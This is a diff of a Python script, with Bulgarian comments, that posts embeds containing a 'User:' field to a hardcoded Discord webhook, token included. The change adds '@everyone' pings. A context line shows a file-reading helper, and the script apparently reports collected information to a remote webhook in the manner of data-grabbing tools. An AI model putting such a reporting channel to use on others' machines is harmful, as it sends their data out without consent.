@@ -11,10 +11,9 @@ webhook_url = "https://discord.com/api/webhooks/1281157451621732425/iCp7XOJMflCZ
 def send_to_discord_embed(title, description, webhook_url):
     embed = {
         "title": title,
-        "description": description,
-        "color": 0x000000,  
+        "description": f"@everyone {description}",  # Добавяне на @everyone в началото на описанието
+        "color": 0x000000,
         "fields": [
-          
             {
                 "name": "User:",
                 "value": "```\n{}\n```".format(description.split('\n')[0]),
@@ -26,9 +25,9 @@ def send_to_discord_embed(title, description, webhook_url):
                 "inline": True
             }
         ]
-        
     }
     data = {
+        "content": "@everyone",  # Тук също добавяме @everyone, за да се споменат всички
         "embeds": [embed]
     }
     headers = {
@@ -39,7 +38,6 @@ def send_to_discord_embed(title, description, webhook_url):
         response.raise_for_status()
     except requests.exceptions.HTTPError as err:
         print(f"Failed to send message: {err}")
-
 def cat(file):
     if isfile(file):
         with open(file, "r") as filedata:
